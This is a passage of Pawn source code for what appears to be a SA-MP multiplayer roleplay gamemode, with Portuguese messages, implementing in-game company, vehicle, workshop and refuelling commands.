					    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
					    return 1;
					}

					if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
					{
					    new co, pid, rwd, pd;

						GetPlayerCompanyData(playerid, co, pid, rwd, pd);

						if(co != com || pid != COMPANY_POST_PARTNER)
					 	{
	    					SendClientMessage(playerid, COLOUR_GRAY, "Você não é dono nem sócio dessa empresa.");
						    return 1;
						}
					}
				
					payday = strval(strtok(cmdtext, idx));
                    payday -= payday % 100;
                    
					if(payday < Jobs[jobid][jobPayday] / 2)
					{
					    new errmsg[128];
					    format(errmsg, sizeof errmsg, "Salário acima de $%d,00 dólares.", Jobs[jobid][jobPayday] / 2);
					    SendClientMessage(playerid, COLOUR_GRAY, errmsg);
					    return 1;
					}
					
					if(payday > 250000)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Salário abaixo de $250000,00 dólares.");
					    return 1;
					}
					
					tmp = strtok(cmdtext, idx);

					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa contratar [id] funcionario [salario] [recompensa]");
					    return 1;
					}
				
					reward = strval(tmp);
					
					if(reward < 0)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Recompensa acima de 0.");
					    return 1;
					}
					
					if(reward > 4000)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Recompensa abaixo de $4000,00 dólares.");
					    return 1;
					}
					
					format(string, sizeof string, "Deseja trabalhar na empresa %s \"%s\"?\n\nCargo: Funcionario\nSalario: $%d,00 dólares\nRecompensa: $%d,00 dólares\n\nAviso: Caso aceitar, voce sairá da empresa atual", Companies[com][cType], Companies[com][cName], payday, reward);
				}
				
				else
				{
					new percent;
					
					payday = strval(strtok(cmdtext, idx));
                    payday -= payday % 100;
                    
					if(payday <= 0)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Salário acima de $0,00 dólares.");
					    return 1;
					}
					
					if(payday > 250000)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Salário abaixo de $250000,00 dólares.");
					    return 1;
					}
					
					tmp = strtok(cmdtext, idx);

					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa contratar [id] socio [salario] [porcentagem] [empresa]");
					    return 1;
					}

					reward = strval(tmp);

					if(reward < 0)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Porcentagem acima de 0.");
					    return 1;
					}
					
					if(reward > 50)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "A porcentagem não pode ultrapassar de 50porcento.");
					    return 1;
					}
					
					strmid(tmp, cmdtext, idx, strlen(cmdtext));

					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa contratar [id] socio [salario] [porcentagem] [empresa]");
					    return 1;
					}

					com = -1;
					for(new c = 1; c < sizeof Companies; c++)
					{
					    if(Companies[c][cValue] > 0 && strcmp(Companies[c][cType], tmp, true) == 0)
					    {
					        com = c;
					        break;
					    }
					}

                    if(com == -1)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Empresa inexistente.");
					    return 1;
					}
					
					cpath = GetCompanyFilePath(com);

					if(!strlen(hGetString(cpath, "Owner")))
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
					    return 1;
					}

					if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o dono dessa empresa.");
					    return 1;
					}
					
					percent = GetCompanyUsedPercent(com);
					
					if(reward + percent > 50)
					{
					    new errmsg[128];
					    format(errmsg, sizeof errmsg, "A porcentagem total não pode passar de 50porcento. Porcentagem atual: %dporcento", percent);
					    SendClientMessage(playerid, COLOUR_GRAY, errmsg);
					    return 1;
					}
					
					format(string, sizeof string, "Deseja trabalhar na empresa %s \"%s\"?\n\nCargo: Socio\nSalario: $%d,00 dolares\nPorcentagem: %dporcento\n\nAviso: Caso aceitar, voce sairá da empresa atual", Companies[com][cType], Companies[com][cName], payday, reward);
				}
				
				SendClientMessage(playerid, COLOUR_GOLD, "Proposta oferecida.");
				SendPlayerInvite(plid, playerid, ((com & 0xFF) << 24) | ((post & 0xF) << 20) | ((reward & 0xFFF) << 8) | ((payday / 100) & 0xFF), INVITE_COMPANY, "Empresas", string, "Sim", "Nao");
				return 1;
			}
			
			else if(strcmp(com_cmd, "demitir", true) == 0)
			{
				new tmp[128], cpath[128];
				new company, post, reward, payday, plid;
				
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa demitir [id]");
				    return 1;
				}
				
				GetPlayerCompanyData(plid, company, post, reward, payday);
				cpath = GetCompanyFilePath(company);
				
				if(Companies[company][cValue] <= 0 || !strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador trabalha em uma empresa pública.");
				    return 1;
				}
				
				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
                    new com, pid, rwd, pd;

					GetPlayerCompanyData(playerid, com, pid, rwd, pd);

					if(com != company || pid != COMPANY_POST_PARTNER)
				 	{
	    				SendClientMessage(playerid, COLOUR_GRAY, "Você não é dono nem sócio dessa empresa.");
					    return 1;
					}
					
					if(post == COMPANY_POST_PARTNER)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode demitir um sócio da empresa.");
					    return 1;
					}
				}
				
				Dismiss(plid);
				SendClientMessage(playerid, COLOUR_GOLD, "Demissão concluída.");
				SendClientMessage(plid, COLOUR_GOLD, "Você foi demitido da sua empresa...");
				return 1;
			}
			
			else if(strcmp(com_cmd, "demitirme", true) == 0)
			{
			    new company, post, reward, payday;
			    
			    GetPlayerCompanyData(playerid, company, post, reward, payday);
			    
				if(company == 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está trabalhando em uma empresa.");
				    return 1;
				}
				
				Dismiss(playerid);
				SendClientMessage(playerid, COLOUR_GOLD, "Você agora não trabalha mais em uma empresa.");
				return 1;
			}
			
			else if(strcmp(com_cmd, "salario", true) == 0)
			{
                new tmp[128], cpath[128], string[128];
				new company, post, reward, payday, plid;

				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa salario [id] [salário]");
				    return 1;
				}

				GetPlayerCompanyData(plid, company, post, reward, payday);
				cpath = GetCompanyFilePath(company);

				if(Companies[company][cValue] <= 0 || !strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador trabalha em uma empresa pública.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
                    new com, pid, rwd, pd;

					GetPlayerCompanyData(playerid, com, pid, rwd, pd);

					if(com != company || pid != COMPANY_POST_PARTNER)
				 	{
	    				SendClientMessage(playerid, COLOUR_GRAY, "Você não é dono nem sócio dessa empresa.");
					    return 1;
					}

					if(post == COMPANY_POST_PARTNER)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode definir o salário de um sócio.");
					    return 1;
					}
				}
				
				payday = strval(strtok(cmdtext, idx));
				payday -= payday % 100;
				
				if(payday < Jobs[Companies[company][cJob]][jobPayday] / 2)
				{
				    new errmsg[128];
				    format(errmsg, sizeof errmsg, "Salário acima de $%d,00 dólares.", Jobs[Companies[company][cJob]][jobPayday] / 2);
				    SendClientMessage(playerid, COLOUR_GRAY, errmsg);
				    return 1;
				}
				
				if(payday > 250000)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Salário abaixo de $250000,00 dólares.");
				    return 1;
				}
				
				Employ(plid, company, post, reward, payday);
				SendClientMessage(playerid, COLOUR_GOLD, "Salário definido.");
				format(string, sizeof string, "Seu salário foi definido para $%d,00 dólares.", payday);
				SendClientMessage(plid, COLOUR_GOLD, string);
				return 1;
			}
			
			else if(strcmp(com_cmd, "recompensa", true) == 0)
			{
                new tmp[128], cpath[128], string[128];
				new company, post, reward, payday, plid;

				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa recompensa [id] [recompensa]");
				    return 1;
				}

				GetPlayerCompanyData(plid, company, post, reward, payday);
				cpath = GetCompanyFilePath(company);

				if(Companies[company][cValue] <= 0 || !strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador trabalha em uma empresa pública.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
                    new com, pid, rwd, pd;

					GetPlayerCompanyData(playerid, com, pid, rwd, pd);

					if(com != company || pid != COMPANY_POST_PARTNER)
				 	{
	    				SendClientMessage(playerid, COLOUR_GRAY, "Você não é dono nem sócio dessa empresa.");
					    return 1;
					}
				}
				
				if(post != COMPANY_POST_EMPLOYEE)
				{
	    			SendClientMessage(playerid, COLOUR_GRAY, "Você só pode definir recompensas de funcionários.");
	    			return 1;
				}

				reward = strval(strtok(cmdtext, idx));

				if(reward < 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Recompensa acima de 0.");
				    return 1;
				}

				if(reward > 4000)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Recompensa abaixo de $4000,00 dólares.");
				    return 1;
				}

				Employ(plid, company, post, reward, payday);
				SendClientMessage(playerid, COLOUR_GOLD, "Recompensa definida.");
				format(string, sizeof string, "Suas recompensas da empresa foram definidas para $%d,00 dólares", reward);
				SendClientMessage(plid, COLOUR_GOLD, string);
				return 1;
			}
			
			else if(strcmp(com_cmd, "porcentagem", true) == 0)
			{
                new tmp[128], cpath[128], string[128];
				new company, post, reward, payday, plid;

				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa recompensa [id] [recompensa]");
				    return 1;
				}

				GetPlayerCompanyData(plid, company, post, reward, payday);
				cpath = GetCompanyFilePath(company);

				if(Companies[company][cValue] <= 0 || !strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador trabalha em uma empresa pública.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
	    			SendClientMessage(playerid, COLOUR_GRAY, "Você não é o dono dessa empresa.");
	   				return 1;
				}

				if(post != COMPANY_POST_PARTNER)
				{
	    			SendClientMessage(playerid, COLOUR_GRAY, "Você só pode definir porcentagens de sócios.");
	    			return 1;
				}

				reward = strval(strtok(cmdtext, idx));

				if(reward < 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Porcentagem acima de 0.");
				    return 1;
				}

				if(reward > 50)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "A porcentagem não pode ultrapassar de 50porcento.");
				    return 1;
				}

				Employ(plid, company, post, reward, payday);
				SendClientMessage(playerid, COLOUR_GOLD, "Porcentagem definida.");
				format(string, sizeof string, "Sua porcentagem de empresa foi definida para %dporcento.", reward);
				SendClientMessage(plid, COLOUR_GOLD, string);
				return 1;
			}
			
			else if(strcmp(com_cmd, "investir", true) == 0)
			{
                new cpath[128];
			    new com, value;

			    com = Company[playerid];

			    if(com == 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma empresa.");
				    return 1;
			    }

			    value = Companies[com][cValue];

			    if(value <= 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Essa é uma empresa pública.");
				    return 1;
			    }

			    cpath = GetCompanyFilePath(com);

			    if(!strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
				    new co, pid, rwd, pd;

					GetPlayerCompanyData(playerid, co, pid, rwd, pd);

					if(co != com || pid != COMPANY_POST_PARTNER)
				 	{
	    				SendClientMessage(playerid, COLOUR_GRAY, "Você não é dono nem sócio dessa empresa.");
					    return 1;
					}
				}
				
				value = strval(strtok(cmdtext, idx));
				
				if(value <= 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa investir [quantidade] - Quantidade acima de 0");
				    return 1;
				}
				
				GivePlayerSysMoney(playerid, -value);
				hSetInt(cpath, "Investment", hGetInt(cpath, "Investment") + value);
				SendClientMessage(playerid, COLOUR_GOLD, "Dinheiro investido.");
				return 1;
			}
			
			else if(strcmp(com_cmd, "info", true) == 0)
			{
                new cpath[128], string[128];
			    new com, value;

			    com = Company[playerid];

			    if(com == 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma empresa.");
				    return 1;
			    }

			    value = Companies[com][cValue];

			    if(value <= 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Essa é uma empresa pública.");
				    return 1;
			    }

			    cpath = GetCompanyFilePath(com);

			    if(!strlen(hGetString(cpath, "Owner")))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
				    return 1;
				}

				if(strcmp(PlayerName(playerid), hGetString(cpath, "Owner")) != 0)
				{
				    new co, pid, rwd, pd;

					GetPlayerCompanyData(playerid, co, pid, rwd, pd);

					if(co != com || pid != COMPANY_POST_PARTNER)
				 	{
	    				SendClientMessage(playerid, COLOUR_GRAY, "Você não é dono nem sócio dessa empresa.");
					    return 1;
					}
				}
				
				format(string, sizeof string, "%s \"%s\" - Informações:", Companies[com][cType], Companies[com][cName]);
				SendClientMessage(playerid, COLOUR_WHITE, string);
				format(string, sizeof string, "Investimento: $%d,00 dólares", hGetInt(cpath, "Investment"));
				SendClientMessage(playerid, COLOUR_GOLD, string);
				return 1;
			}
			
			else if(strcmp(com_cmd, "funcionarios", true) == 0)
			{
                new cpath[128], owner[128], string[128];
			    new company, value;
				new bool:showstats;
				
			    company = Company[playerid];

			    if(company == 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma empresa.");
				    return 1;
			    }

			    value = Companies[company][cValue];

			    if(value <= 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Essa é uma empresa pública.");
				    return 1;
			    }

			    cpath = GetCompanyFilePath(company);
				owner = hGetString(cpath, "Owner");
				
			    if(!strlen(owner))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa empresa não possui dono.");
				    return 1;
				}

				showstats = true;
				
				if(strcmp(PlayerName(playerid), owner) != 0)
				{
				    new co, pid, rwd, pd;

					GetPlayerCompanyData(playerid, co, pid, rwd, pd);

					if(co != company)
					{
					    SendClientMessage(playerid, COLOUR_GRAY, "Você não tem acesso à essas informações.");
				    	return 1;
					}
					
					if(pid != COMPANY_POST_PARTNER)
	    				showstats = false;
				}
				    
	            format(string, sizeof string, "%s \"%s\" - Funcionários:", Companies[company][cType], Companies[company][cName]);
	            SendClientMessage(playerid, COLOUR_WHITE, string);
	            format(string, sizeof string, "[Dono] %s", owner);
	            SendClientMessage(playerid, COLOUR_GOLD, string);

	            for(new p = 2; p > 0; p--)
	            {
     		    	for(new n = 0; n < MAX_SLOTS; n++)
     		    	{
     		    	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
     		    	    {
     		    	        new com, pid, rwd, pd;
     		    	        
     		    	        GetPlayerCompanyData(n, com, pid, rwd, pd);
     		    	        
     		    	        if(com == company && pid == p)
     		    	        {
     		    	        	switch(p)
     		    	        	{
     		    	                case COMPANY_POST_PARTNER:
     		    	                {
     		    	                    if(!showstats)
     		    	                    	format(string, sizeof string, "[Sócio] %s", PlayerName(n));

										else
										    format(string, sizeof string, "[Sócio] %s - Salário: $%d,00 dólares - Porcentagem: %dporcento", PlayerName(n), pd, rwd);

     			                		SendClientMessage(playerid, COLOUR_GOLD, string);
     		    	                }
     		    	                
     		    	                case COMPANY_POST_EMPLOYEE:
     		    	                {
     		    	                    if(!showstats)
     		    	                    	format(string, sizeof string, "[Funcionário] %s", PlayerName(n));
     		    	                    	
										else
										    format(string, sizeof string, "[Funcionário] %s - Salário: $%d,00 dólares - Recompensa: $%d,00 dólares", PlayerName(n), pd, rwd);
										    
     			                		SendClientMessage(playerid, COLOUR_GOLD, string);
     		    	                }
     		    	        	}
							}
     		        	}
     		    	}
     		    }
     		    
     		    return 1;
			}
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /empresa [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "comprar, vender, fechar, contratar, demitir, demitirme, salario, recompensa,");
	    SendClientMessage(playerid, COLOUR_GRAY, "porcentagem, investir, info, funcionarios");
	    return 1;
	}
	
	if(strcmp(cmd, "/veiculo", true) == 0)
	{
	    new vehicle_cmd[128];

	    vehicle_cmd = strtok(cmdtext, idx);

	    if(strlen(vehicle_cmd) > 0)
	    {
			if(strcmp(vehicle_cmd, "comprar", true) == 0)
			{
			    new xpath[128], vpath[128];
			    new value, model, vfs, vehicleid;
			    
			    xpath = GetPlayerXFilePath(playerid);

			    if(!IsPlayerAdmin(playerid) && hGetInt(xpath, "Level") < MIN_LEVEL_BUY_VEHICLE)
				{
				    new string[128];
					format(string, sizeof string, "Você não tem level o suficiente para comprar um veículo (Mínimo: %d)", MIN_LEVEL_BUY_VEHICLE);
					SendClientMessage(playerid, COLOUR_GRAY, string);
					return 1;
				}
				
			    vehicleid = GetNextPlayerVehicle(playerid, 20.0);
			    
 				if(vehicleid == INVALID_VEHICLE_ID)
			  	{
			  	    SendClientMessage(playerid, COLOUR_GRAY, "Você não está próximo a um veículo.");
				    return 1;
				}
			    
			    model = GetVehicleModel(vehicleid);
	            vfs = GetVehicleForSaleId(vehicleid);
				
				if(vfs == -1)
				{
    				vpath = GetVehicleFilePath(vehicleid);
			    	value = hGetInt(vpath, "Value");
			    }
			    
			    else
			        value = Vehicles[model - 400][vehValue];
			        
                if(value <= 0)
	    		{
   	    			SendClientMessage(playerid, COLOUR_GRAY, "Este veículo não está a venda.");
					return 1;
  				}
			    	
			    if(GetPlayerSysMoney(playerid) < value)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro para comprar este veículo.");
					return 1;
			    }
			    
			    if(vfs != -1)
			    {
			        new plate[128];
			        new sysid;
			        new Float:X, Float:Y, Float:Z, Float:A;
			        
			        sysid = -1;
					for(new v = 0; v < sizeof VehicleId; v++)
					{
						vpath = GetSysVehicleFilePath(v);

						if(!fexist(vpath) || hGetInt(vpath, "Deleted") == 1)
						{
		    				sysid = v;
		    				break;
						}
					}
					
					if(sysid == -1)
	    				return -1;

                    format(plate, sizeof plate, "VSR %d", sysid + 2000);
					SetVehicleNumberPlate(vehicleid, plate);
					
                    GetVehiclePos(vehicleid, X, Y, Z);
			        GetVehicleZAngle(vehicleid, A);
			        Delete3DTextLabel(VehiclesForSale[vfs][osText]);
                    VehiclesForSale[vfs][osVehId] = -1;
                    VehicleId[sysid] = vehicleid;
                    
                    hUnset(vpath, "Deleted");
					hSetString(vpath, "Owner", PlayerName(playerid));
					hSetString(vpath, "NumberPlate", plate);
					hSetInt(vpath, "Model", model);
					hSetInt(vpath, "Fuel", 100);
					hSetInt(vpath, "Value", 0);
					hSetInt(vpath, "Fine", 0);
					hSetInt(vpath, "Tun0", 0xFFFFFFFF);
					hSetInt(vpath, "Tun1", 0xFFFFFFFF);
					hSetInt(vpath, "Tun2", 0xFFFFFFFF);
					hSetInt(vpath, "Tun3", 0xFFFFFFFF);
					hSetInt(vpath, "Tun4", 0xFFFFFFFF);
					hSetInt(vpath, "Colours", VehiclesForSale[vfs][osColours]);
					hSetInt(vpath, "Params", 0);
    				SaveVehiclePos(vehicleid, X, Y, Z, A);
			    }
			    
			    else
			    {
			        new string[256], owner[128];
			        
			        owner = hGetString(vpath, "Owner");
			        xpath = GetPlayerNameXFilePath(owner);
			        
			        if(strcmp(PlayerName(playerid), owner, true) == 0)
			        {
			            SendClientMessage(playerid, COLOUR_GRAY, "Você não pode comprar seu próprio veículo.");
						return 1;
			        }
			        
			        hSetString(vpath, "Owner", PlayerName(playerid));
			        hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") + value);
			        format(string, sizeof string, "[ Seu veículo, de modelo %s, foi comprado por %s (Banco +$%d,00 dólares) ]", Vehicles[model - 400][vehModel], PlayerName(playerid), value);
			        SendPhoneMessage(owner, "Virtual'Autos", string);
			    }
			    
			    GivePlayerSysMoney(playerid, -value);
			    SetVehicleParamsForPlayer(vehicleid, playerid, 0, 0);
			    SendClientMessage(playerid, COLOUR_GREEN, "Veículo adquirido, estacione-o em outro lugar (/veiculo estacionar) ou ele será fiscalizado.");
			    return 1;
			}
			
			else if(strcmp(vehicle_cmd, "vender", true) == 0)
			{
			    new vpath[128], string[128];
			    new model, value, vehicleid;
			    
			    vehicleid = GetNextPlayerVehicle(playerid, 20.0);
			    
			    if(vehicleid == INVALID_VEHICLE_ID)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não está próximo a um veículo.");
				    return 1;
			    }
			    
			    vpath = GetVehicleFilePath(vehicleid);
			    
			    if(!IsPlayerAdmin(playerid) && strcmp(PlayerName(playerid), hGetString(vpath, "Owner"), true) != 0)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário do veículo.");
			        return 1;
			    }
			    
				if(hGetInt(vpath, "Value") > 0)
				{
				    hSetInt(vpath, "Value", 0);
				    SendClientMessage(playerid, COLOUR_GREEN, "Veículo retirado de venda.");
				}
				
				else
				{
			    	model = GetVehicleModel(vehicleid);
			    	value = strval(strtok(cmdtext, idx));
			    
			    	if(value < Vehicles[model - 400][vehValue] / 2)
			    	{
			    	    format(string, sizeof string, "USO: /veiculo vender [valor] - Valor acima de $%d,00 dólares.", Vehicles[model - 400][vehValue] / 2);
			    	    SendClientMessage(playerid, COLOUR_GRAY, string);
			    	    return 1;
			    	}
			    
			    	hSetInt(vpath, "Value", value);
			    	format(string, sizeof string, "Veículo colocado a venda [Valor: $%d,00 dólares]", value);
			    	SendClientMessage(playerid, COLOUR_GREEN, string);
				}
				
				return 1;
			}
			
			else if(strcmp(vehicle_cmd, "desmanchar", true) == 0)
			{
			    new vpath[128], string[128];
			    new vehid, value;
			    
				if(Area[playerid] != AREA_CHOP)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está no desmanche.");
				    return 1;
				}
				
				if(!IsPlayerInAnyVehicle(playerid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
				    return 1;
				}
				
				vehid = GetPlayerVehicleID(playerid);
				
				if(!IsPlayerVehicle(vehid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar em um veículo seu.");
				    return 1;
				}
				
				vpath = GetVehicleFilePath(vehid);
				
				if(strcmp(hGetString(vpath, "Owner"), PlayerName(playerid), true) != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário do veículo.");
				    return 1;
				}
				
				value = (Vehicles[GetVehicleModel(vehid) - 400][vehValue] / 4) & 0xFFFF;
				format(string, sizeof string, "Tem certeza que quer desmanchar seu veículo?\nValor: $%d,00 dólares.", value);
				SendPlayerInvite(playerid, INVALID_PLAYER_ID, (value << 16) | (vehid & 0xFFFF), INVITE_CHOP, "Desmanche", string, "Sim", "Não");
			    return 1;
			}
			
			else if(strcmp(vehicle_cmd, "estacionar", true) == 0)
			{
				new vehid;
				new Float:X, Float:Y, Float:Z, Float:A;
				
				if(!IsPlayerInAnyVehicle(playerid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
				    return 1;
				}
				
				vehid = GetPlayerVehicleID(playerid);
				
				if(IsServerVehicle(vehid) || IsVehicleForSale(vehid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode estacionar um veículo do servidor.");
				    return 1;
				}
				
				if(!IsPlayerAdmin(playerid) && strcmp(PlayerName(playerid), hGetString(GetVehicleFilePath(vehid), "Owner"), true) != 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não é o proprietário do veículo.");
				    return 1;
				}
				
				GetVehiclePos(vehid, X, Y, Z);
				GetVehicleZAngle(vehid, A);
				SaveVehiclePos(vehid, X, Y, Z, A);
				SendClientMessage(playerid, COLOUR_GREEN, "Veículo estacionado.");
				return 1;
			}
	    }

	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /veiculo [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "comprar, vender, estacionar");
	    return 1;
	}
	
	if(strcmp(cmd, "/oficina", true) == 0)
	{
	    new workshop_cmd[128];
	    new vehid;
	    
	    if(Area[playerid] != AREA_CUSTOM_SHOP)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está em uma oficina.");
		    return 1;
	    }
	    
	    workshop_cmd = strtok(cmdtext, idx);
	    
	    if(strlen(workshop_cmd) > 0)
	    {
	    	if(strcmp(workshop_cmd, "consertar", true) == 0)
	    	{
	    	    new string[128];
	    	    new pay;
	    	    new Float:health;
	    	    
	    	    if(VFrozenFlags[playerid] & VFROZEN_REPAIR)
	    	    {
	    	        SendClientMessage(playerid, COLOUR_GRAY, "Você já está consertando um veículo.");
		            return 1;
	    	    }
	    	    
	    	    if(!IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
		            return 1;
		        }
		        
				vehid = GetPlayerVehicleID(playerid);
		        GetVehicleHealth(vehid, health);
		        
		        if(health >= 1000.0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já está íntegro.");
		            return 1;
		        }
		        
		        pay = floatround(1000.0 - health) / 2;
		        pay = pay - (pay % 50) + 100;
		        
		        if(GetPlayerSysMoney(playerid) < pay)
		        {
		            format(string, sizeof string, "Você não possui dinheiro. Custo: $%d,00 dólares.", pay);
		    		SendClientMessage(playerid, COLOUR_GRAY, string);
		    		return 1;
		        }

                format(string, sizeof string, "Deseja consertar seu veiculo?\nValor:$%d,00 dólares", pay);
                SendPlayerInvite(playerid, INVALID_PLAYER_ID, (pay << 16) | (vehid & 0xFFFF), INVITE_REPAIR, "Conserto:", string, "Sim", "Nao");
	    	    return 1;
	    	}
	    
	    	else if(strcmp(workshop_cmd, "pintar", true) == 0)
	    	{
	    	    if(VFrozenFlags[playerid] & VFROZEN_PAINT)
	    	    {
	    	        SendClientMessage(playerid, COLOUR_GRAY, "Você já está pintando um veículo.");
	    	        return 1;
	    	    }

		        if(!IsPlayerInAnyVehicle(playerid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
		            return 1;
		        }
		        
		        if(GetPlayerSysMoney(playerid) < 100)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui dinheiro. Custo: $100,00 dólares.");
		            return 1;
		        }

		        vehid = GetPlayerVehicleID(playerid);
		        
		        if(!IsPlayerAdmin(playerid) && IsPlayerVehicle(vehid))
		        {
		            if(strcmp(hGetString(GetVehicleFilePath(vehid), "Owner"), PlayerName(playerid), true) != 0)
		            {
		                SendClientMessage(playerid, COLOUR_GRAY, "Você não pode pintar um veículo de outro jogador.");
		            	return 1;
		            }
		        }
		        
				KeyEvent[playerid] |= KEY_EVENT_PAINTING;
		        VFrozenFlags[playerid] |= VFROZEN_PAINT;
		        TogglePlayerControllable(playerid, false);
		        PaintVehicle[playerid] = vehid;
		        PaintStage[playerid] = 0;
		        PaintColours[playerid] = GetVehicleColoursEx(vehid);
		        TextDrawShowForPlayer(playerid, tdarrows);
		        DrawTextForPlayer(playerid, "Pressione ~g~~k~~PED_SPRINT~ ~w~para concluir.", COLOUR_WHITE, TEXTDRAW_STYLE_4, 5000);
		        return 1;
		    }
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /oficina [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "consertar, pintar");
	    return 1;
	}
	
	if(strcmp(cmd, "/abastecer", true) == 0)
	{
	    new tmp[128], string[128];
	    new pay, vehid, fuel;
	    new Text:tdfuel;
	    
	    if(Area[playerid] != AREA_GAS_STATION)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um posto.");
		    return 1;
		}
		
        if(VFrozenFlags[playerid] & VFROZEN_FUEL)
   	    {
          	SendClientMessage(playerid, COLOUR_GRAY, "Você já está abastecendo um veículo.");
 	        return 1;
   	    }
	    	    
		if(!IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
		    return 1;
		}
		
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /abastecer [valor a pagar ou completar]");
		    return 1;
		}
		
		vehid = GetPlayerVehicleID(playerid);
		fuel = GetVehicleFuel(vehid);
		
		if(fuel == 100)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já está com o tanque completo.");
		    return 1;
		}
		
		if(fuel > 100)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este veículo não pode ser abastecido.");
		    return 1;
		}
		
		if(strcmp(tmp, "completar", true) == 0)
			pay = 100 * FUEL_COST;

		else
		    pay = strval(tmp);

        if(pay < FUEL_COST)
		{
		    format(string, sizeof string, "Valor acima de $%d,00 dólares.", FUEL_COST);
            SendClientMessage(playerid, COLOUR_GRAY, string);
		    return 1;
		}
		
		if((pay / FUEL_COST) + fuel > 100)
		    pay = (100 - fuel) * FUEL_COST;
		    
